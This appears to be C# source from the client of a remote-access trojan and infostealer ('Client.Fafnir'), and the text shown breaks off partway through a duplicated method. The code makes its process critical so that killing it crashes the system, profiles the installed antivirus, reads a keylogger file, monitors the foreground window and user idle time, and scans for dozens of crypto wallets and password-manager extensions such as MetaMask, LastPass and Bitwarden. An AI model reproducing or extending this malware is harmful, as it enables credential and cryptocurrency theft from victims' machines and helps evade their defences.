using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using Microsoft.Win32;

namespace Client.Fafnir;

public static class Methods
{
	internal struct LASTINPUTINFO
	{
		public uint cbSize;

		public uint dwTime;
	}

	public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static readonly string loggerPath = ApplicationData + "\\winLog.txt";

	private static Timer timer;

	public static string Lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	public static string FileContent { get; private set; }

	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void ClientOnExit()
	{
		try
		{
			if (Convert.ToBoolean(Settings.BS_OD) && IsAdmin())
			{
				ProcessCritical.Exit();
			}
			MutexControl.CloseMutex();
			ClientSocket.SslClient?.Close();
			ClientSocket.TcpClient?.Close();
		}
		catch
		{
		}
	}

	public static void KF()
	{
	}

	public static string Antivirus()
	{
		try
		{
			string text = string.Empty;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
			{
				foreach (ManagementObject item in managementObjectSearcher.Get())
				{
					text = text + item["displayName"].ToString() + "; ";
				}
			}
			text = RemoveLastChars(text);
			return (!string.IsNullOrEmpty(text)) ? text : "N/A";
		}
		catch
		{
			return "Unknown";
		}
	}

	internal static void OffLoEx()
	{
		throw new NotImplementedException();
	}

	public static void StartReading()
	{
		timer = new Timer(5000.0);
		timer.Elapsed += ReadFileContent;
		timer.AutoReset = true;
		timer.Enabled = true;
	}

	private static void ReadFileContent(object source, ElapsedEventArgs e)
	{
		try
		{
			FileContent = File.ReadAllText(loggerPath);
			Console.WriteLine(FileContent);
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error reading file: " + ex.Message);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll")]
	private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

	public static Task<string> CheckIdle()
	{
		return Task.Factory.StartNew(() =>
		{
			LASTINPUTINFO plii = new LASTINPUTINFO
			{
				cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO))
			};
			GetLastInputInfo(ref plii);
			int num = Environment.TickCount - (int)plii.dwTime;
			string text = "User is Active";
			string text2 = "User is Idle";
			return ((uint)num > 5000u) ? text2 : text;
		});
	}

	public static string GetWallets()
	{
		try
		{
			Dictionary<string, bool> dictionary = new Dictionary<string, bool>();
			List<string> list = new List<string>();
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey("Litecoin")?.OpenSubKey("Litecoin-Qt");
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey("Dash")?.OpenSubKey("Dash-Qt");
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey("Bitcoin")?.OpenSubKey("Bitcoin-Qt");
			if (registryKey != null)
			{
				dictionary["Litecoin"] = true;
				list.Add("Litecoin");
			}
			if (registryKey2 != null)
			{
				dictionary["Dash"] = true;
				list.Add("Dash");
			}
			if (registryKey3 != null)
			{
				dictionary["Bitcoin"] = true;
				list.Add("Bitcoin");
			}
			if (Directory.Exists(Appdata + "\\Zcash"))
			{
				dictionary["Zcash"] = true;
				list.Add("Zcash");
			}
			if (Directory.Exists(Appdata + "\\Armory"))
			{
				dictionary["Armory"] = true;
				list.Add("Armory");
			}
			if (Directory.Exists(Appdata + "\\bytecoin"))
			{
				dictionary["Bytecoin"] = true;
				list.Add("Bytecoin");
			}
			if (Directory.Exists(Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"))
			{
				dictionary["Jaxx"] = true;
				list.Add("Jaxx");
			}
			if (Directory.Exists(Appdata + "\\Exodus\\exodus.wallet"))
			{
				dictionary["Exodus"] = true;
				list.Add("Exodus");
			}
			if (Directory.Exists(Appdata + "\\Guarda\\Local Storage\\leveldb"))
			{
				dictionary["Guarda"] = true;
				list.Add("Guarda");
			}
			if (Directory.Exists(Lappdata + "\\Coinomi\\Coinomi\\wallets"))
			{
				dictionary["Coinomi"] = true;
				list.Add("Coinomi");
			}
			if (Directory.Exists(Appdata + "\\Ledger Live"))
			{
				dictionary["Ledger"] = true;
				list.Add("Ledger");
			}
			if (Directory.Exists(Appdata + "\\Binance"))
			{
				dictionary["Binance"] = true;
				list.Add("Binance");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"))
			{
				dictionary["Chrome_Liquality"] = true;
				list.Add("Chrome_Liquality");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"))
			{
				dictionary["Chrome_Coinbase"] = true;
				list.Add("Chrome_Coinbase");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"))
			{
				dictionary["Chrome_XDEFI"] = true;
				list.Add("Chrome_XDEFI");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ocjdpmoallmgmjbbogfiiaofphbjgchh"))
			{
				dictionary["Chrome_Elli-Sui"] = true;
				list.Add("Chrome_Elli-Sui");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kppfdiipphfccemcignhifpjkapfbihd"))
			{
				dictionary["Chrome_Frontier"] = true;
				list.Add("Chrome_Frontier");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afkoofjocpbclhnldmmaphappihehpma"))
			{
				dictionary["Chrome_ZKPass"] = true;
				list.Add("Chrome_ZKPass");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cnncmdhjacpkmjmkcafchppbnpnhdmon"))
			{
				dictionary["Chrome_HAVAH"] = true;
				list.Add("Chrome_HAVAH");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\onhogfjeacnfoofkfgppdlbmlmnplgbn"))
			{
				dictionary["Chrome_SubWallet_Polkadot"] = true;
				list.Add("Chrome_SubWallet_Polkadot");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"))
			{
				dictionary["Chrome_MultiversXDeFi"] = true;
				list.Add("Chrome_MultiversXDeFi");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lmbifcmbofehdpolpdpnlcnanolnlkec"))
			{
				dictionary["Chrome_Klever"] = true;
				list.Add("Chrome_Klever");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cnlhokffphohmfcddnibpohmkdfafdli"))
			{
				dictionary["Chrome_MultiPassword"] = true;
				list.Add("Chrome_MultiPassword");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jkjgekcefbkpogohigkgooodolhdgcda"))
			{
				dictionary["Chrome_BitPay"] = true;
				list.Add("Chrome_BitPay");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ilgcnhelpchnceeipipijaljkblbcobl"))
			{
				dictionary["Chrome_GAuthAuthenticator"] = true;
				list.Add("Chrome_GAuthAuthenticator");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fdjamakpfbbddfjaooikfcpapjohcfmg"))
			{
				dictionary["Chrome_Dashlane"] = true;
				list.Add("Chrome_Dashlane");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlccmojcmeohlpggmfnbbiapkmbliob"))
			{
				dictionary["Chrome_RoboForm"] = true;
				list.Add("Chrome_RoboForm");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\heefohaffomkkkphnlpohglngmbcclhi"))
			{
				dictionary["Chrome_MorphisWallet"] = true;
				list.Add("Chrome_MorphisWallet");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"))
			{
				dictionary["Chrome_Authenticator"] = true;
				list.Add("Chrome_Authenticator");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"))
			{
				dictionary["Chrome_FewchaWallet"] = true;
				list.Add("Chrome_FewchaWallet");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ojggmchlghnjlapmfbnjholfjkiidbch"))
			{
				dictionary["Chrome_VenomWallet"] = true;
				list.Add("Chrome_VenomWallet");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\gojhcdgcpbpfigcaejpfhfegekdgiblk"))
			{
				dictionary["Chrome_OperaWallet"] = true;
				list.Add("Chrome_OperaWallet");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\abogmiocnneedmmepnohnhlijcjpcifd"))
			{
				dictionary["Chrome_Blade-Hedera"] = true;
				list.Add("Chrome_Blade-Hedera");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hdokiejnpimakedhajhdlcegeplioahd"))
			{
				dictionary["Chrome_LastPass"] = true;
				list.Add("Chrome_LastPass");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\idnnbdplmphpflfnlkomgpfbpcgelopg"))
			{
				dictionary["Chrome_Xverseapp"] = true;
				list.Add("Chrome_Xverseapp");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mmmjbcfofconkannjonfmjjajpllddbg"))
			{
				dictionary["Chrome_Fluvi"] = true;
				list.Add("Chrome_Fluvi");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nngceckbapebfimnlniiiahkandclblb"))
			{
				dictionary["Chrome_Bitwarden"] = true;
				list.Add("Chrome_Bitwarden");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jgaaimajipbpdogpdglhaphldakikgef"))
			{
				dictionary["Chrome_Coinhub"] = true;
				list.Add("Chrome_Coinhub");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"))
			{
				dictionary["Chrome_SafePal"] = true;
				list.Add("Chrome_SafePal");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\loinekcabhlmhjjbocijdoimmejangoa"))
			{
				dictionary["Chrome_Glass"] = true;
				list.Add("Chrome_Glass");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\gjagmgiddbbciopjhllkdnddhcglnemk"))
			{
				dictionary["Chrome_Hashpack"] = true;
				list.Add("Chrome_Hashpack");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfogiafebfohielmmehodmfbbebbbpei"))
			{
				dictionary["Chrome_Keeper®"] = true;
				list.Add("Chrome_Keeper®");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"))
			{
				dictionary["Chrome_Nifty"] = true;
				list.Add("Chrome_Nifty");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"))
			{
				dictionary["Chrome_Oxygen"] = true;
				list.Add("Chrome_Oxygen");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"))
			{
				dictionary["Chrome_Crocobit"] = true;
				list.Add("Chrome_Crocobit");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"))
			{
				dictionary["Chrome_Keplr"] = true;
				list.Add("Chrome_Keplr");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"))
			{
				dictionary["Chrome_Finnie"] = true;
				list.Add("Chrome_Finnie");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"))
			{
				dictionary["Chrome_Swash"] = true;
				list.Add("Chrome_Swash");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"))
			{
				dictionary["Chrome_Starcoin"] = true;
				list.Add("Chrome_Starcoin");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"))
			{
				dictionary["Chrome_Slope"] = true;
				list.Add("Chrome_Slope");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"))
			{
				dictionary["Chrome_Sollet"] = true;
				list.Add("Chrome_Sollet");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"))
			{
				dictionary["Chrome_Metamask"] = true;
				list.Add("Chrome_Metamask");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"))
			{
				dictionary["Chrome_Ton"] = true;
				list.Add("Chrome_Ton");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"))
			{
				dictionary["Chrome_XinPay"] = true;
				list.Add("Chrome_XinPay");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"))
			{
				dictionary["Chrome_Tron"] = true;
				list.Add("Chrome_Tron");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"))
			{
				dictionary["Chrome_Phantom"] = true;
				list.Add("Chrome_Phantom");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"))
			{
				dictionary["Chrome_Mobox"] = true;
				list.Add("Chrome_Mobox");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"))
			{
				dictionary["Chrome_Math"] = true;
				list.Add("Chrome_Math");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"))
			{
				dictionary["Chrome_Iconex"] = true;
				list.Add("Chrome_Iconex");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"))
			{
				dictionary["Chrome_Guild"] = true;
				list.Add("Chrome_Guild");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"))
			{
				dictionary["Chrome_Equal"] = true;
				list.Add("Chrome_Equal");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"))
			{
				dictionary["Chrome_Coin98"] = true;
				list.Add("Chrome_Coin98");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"))
			{
				dictionary["Chrome_Bitapp"] = true;
				list.Add("Chrome_Bitapp");
			}
			if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"))
			{
				dictionary["Chrome_Binance"] = true;
				list.Add("Chrome_Binance");
			}
			if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"))
			{
				dictionary["Edge_Auvitas"] = true;
				list.Add("Edge_Auvitas");
			}
			if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"))
			{
				dictionary["Edge_Math"] = true;
				list.Add("Edge_Math");
			}
			if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"))
			{
				dictionary["Edge_Metamask"] = true;
				list.Add("Edge_Metamask");
			}
			if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"))
			{
				dictionary["Edge_MTV"] = true;
				list.Add("Edge_MTV");
			}
			if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"))
			{
				dictionary["Edge_Rabet"] = true;
				list.Add("Edge_Rabet");
			}
			if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"))
			{
				dictionary["Edge_Ronin"] = true;
				list.Add("Edge_Ronin");
			}
			if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"))
			{
				dictionary["Edge_Yoroi"] = true;
				list.Add("Edge_Yoroi");
			}
			if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"))
			{
				dictionary["Edge_Zilpay"] = true;
				list.Add("Edge_Zilpay");
			}
			if (Directory.Exists(Appdata + "\\Ethereum\\keystore"))
			{
				dictionary["Ethereum"] = true;
				list.Add("Ethereum");
			}
			if (Directory.Exists(Appdata + "\\Electrum\\wallets"))
			{
				dictionary["Electrum"] = true;
				list.Add("Electrum");
			}
			if (Directory.Exists(Appdata + "\\atomic\\Local Storage\\leveldb"))
			{
				dictionary["Atomic"] = true;
				list.Add("Atomic");
			}
			if (dictionary.Count == 0)
			{
				return "No Wallets Found";
			}
			return string.Join(", ", list);
		}
		catch
		{
		}
		return "No Wallets Found";
	}

	public static Task<string> GetWalletNamesAsync()
	{
		return Task.Factory.StartNew(() =>
		{
			try
			{
				Dictionary<string, bool> dictionary = new Dictionary<string, bool>();
				List<string> list = new List<string>();
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey("Litecoin")?.OpenSubKey("Litecoin-Qt");
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey("Dash")?.OpenSubKey("Dash-Qt");
				RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey("Bitcoin")?.OpenSubKey("Bitcoin-Qt");
				if (registryKey != null)
				{
					dictionary["Litecoin"] = true;
					list.Add("Litecoin");
				}
				if (registryKey2 != null)
				{
					dictionary["Dash"] = true;
					list.Add("Dash");
				}
				if (registryKey3 != null)
				{
					dictionary["Bitcoin"] = true;
					list.Add("Bitcoin");
				}
				if (Directory.Exists(Appdata + "\\Zcash"))
				{
					dictionary["Zcash"] = true;
					list.Add("Zcash");
				}
				if (Directory.Exists(Appdata + "\\Armory"))
				{
					dictionary["Armory"] = true;
					list.Add("Armory");
				}
				if (Directory.Exists(Appdata + "\\bytecoin"))
				{
					dictionary["Bytecoin"] = true;
					list.Add("Bytecoin");
				}
				if (Directory.Exists(Appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"))
				{
					dictionary["Jaxx"] = true;
					list.Add("Jaxx");
				}
				if (Directory.Exists(Appdata + "\\Exodus\\exodus.wallet"))
				{
					dictionary["Exodus"] = true;
					list.Add("Exodus");
				}
				if (Directory.Exists(Appdata + "\\Guarda\\Local Storage\\leveldb"))
				{
					dictionary["Guarda"] = true;
					list.Add("Guarda");
				}
				if (Directory.Exists(Lappdata + "\\Coinomi\\Coinomi\\wallets"))
				{
					dictionary["Coinomi"] = true;
					list.Add("Coinomi");
				}
				if (Directory.Exists(Appdata + "\\Ledger Live"))
				{
					dictionary["Ledger"] = true;
					list.Add("Ledger");
				}
				if (Directory.Exists(Appdata + "\\Binance"))
				{
					dictionary["Binance"] = true;
					list.Add("Binance");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"))
				{
					dictionary["Chrome_Liquality"] = true;
					list.Add("Chrome_Liquality");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"))
				{
					dictionary["Chrome_Coinbase"] = true;
					list.Add("Chrome_Coinbase");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"))
				{
					dictionary["Chrome_XDEFI"] = true;
					list.Add("Chrome_XDEFI");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ocjdpmoallmgmjbbogfiiaofphbjgchh"))
				{
					dictionary["Chrome_Elli-Sui"] = true;
					list.Add("Chrome_Elli-Sui");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kppfdiipphfccemcignhifpjkapfbihd"))
				{
					dictionary["Chrome_Frontier"] = true;
					list.Add("Chrome_Frontier");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afkoofjocpbclhnldmmaphappihehpma"))
				{
					dictionary["Chrome_ZKPass"] = true;
					list.Add("Chrome_ZKPass");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cnncmdhjacpkmjmkcafchppbnpnhdmon"))
				{
					dictionary["Chrome_HAVAH"] = true;
					list.Add("Chrome_HAVAH");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\onhogfjeacnfoofkfgppdlbmlmnplgbn"))
				{
					dictionary["Chrome_SubWallet_Polkadot"] = true;
					list.Add("Chrome_SubWallet_Polkadot");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"))
				{
					dictionary["Chrome_MultiversXDeFi"] = true;
					list.Add("Chrome_MultiversXDeFi");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lmbifcmbofehdpolpdpnlcnanolnlkec"))
				{
					dictionary["Chrome_Klever"] = true;
					list.Add("Chrome_Klever");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cnlhokffphohmfcddnibpohmkdfafdli"))
				{
					dictionary["Chrome_MultiPassword"] = true;
					list.Add("Chrome_MultiPassword");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jkjgekcefbkpogohigkgooodolhdgcda"))
				{
					dictionary["Chrome_BitPay"] = true;
					list.Add("Chrome_BitPay");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ilgcnhelpchnceeipipijaljkblbcobl"))
				{
					dictionary["Chrome_GAuthAuthenticator"] = true;
					list.Add("Chrome_GAuthAuthenticator");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fdjamakpfbbddfjaooikfcpapjohcfmg"))
				{
					dictionary["Chrome_Dashlane"] = true;
					list.Add("Chrome_Dashlane");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlccmojcmeohlpggmfnbbiapkmbliob"))
				{
					dictionary["Chrome_RoboForm"] = true;
					list.Add("Chrome_RoboForm");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\heefohaffomkkkphnlpohglngmbcclhi"))
				{
					dictionary["Chrome_MorphisWallet"] = true;
					list.Add("Chrome_MorphisWallet");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"))
				{
					dictionary["Chrome_Authenticator"] = true;
					list.Add("Chrome_Authenticator");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"))
				{
					dictionary["Chrome_FewchaWallet"] = true;
					list.Add("Chrome_FewchaWallet");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ojggmchlghnjlapmfbnjholfjkiidbch"))
				{
					dictionary["Chrome_VenomWallet"] = true;
					list.Add("Chrome_VenomWallet");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\gojhcdgcpbpfigcaejpfhfegekdgiblk"))
				{
					dictionary["Chrome_OperaWallet"] = true;
					list.Add("Chrome_OperaWallet");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\abogmiocnneedmmepnohnhlijcjpcifd"))
				{
					dictionary["Chrome_Blade-Hedera"] = true;
					list.Add("Chrome_Blade-Hedera");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hdokiejnpimakedhajhdlcegeplioahd"))
				{
					dictionary["Chrome_LastPass"] = true;
					list.Add("Chrome_LastPass");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\idnnbdplmphpflfnlkomgpfbpcgelopg"))
				{
					dictionary["Chrome_Xverseapp"] = true;
					list.Add("Chrome_Xverseapp");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mmmjbcfofconkannjonfmjjajpllddbg"))
				{
					dictionary["Chrome_Fluvi"] = true;
					list.Add("Chrome_Fluvi");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nngceckbapebfimnlniiiahkandclblb"))
				{
					dictionary["Chrome_Bitwarden"] = true;
					list.Add("Chrome_Bitwarden");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jgaaimajipbpdogpdglhaphldakikgef"))
				{
					dictionary["Chrome_Coinhub"] = true;
					list.Add("Chrome_Coinhub");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"))
				{
					dictionary["Chrome_SafePal"] = true;
					list.Add("Chrome_SafePal");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\loinekcabhlmhjjbocijdoimmejangoa"))
				{
					dictionary["Chrome_Glass"] = true;
					list.Add("Chrome_Glass");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\gjagmgiddbbciopjhllkdnddhcglnemk"))
				{
					dictionary["Chrome_Hashpack"] = true;
					list.Add("Chrome_Hashpack");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfogiafebfohielmmehodmfbbebbbpei"))
				{
					dictionary["Chrome_Keeper®"] = true;
					list.Add("Chrome_Keeper®");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"))
				{
					dictionary["Chrome_Nifty"] = true;
					list.Add("Chrome_Nifty");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"))
				{
					dictionary["Chrome_Oxygen"] = true;
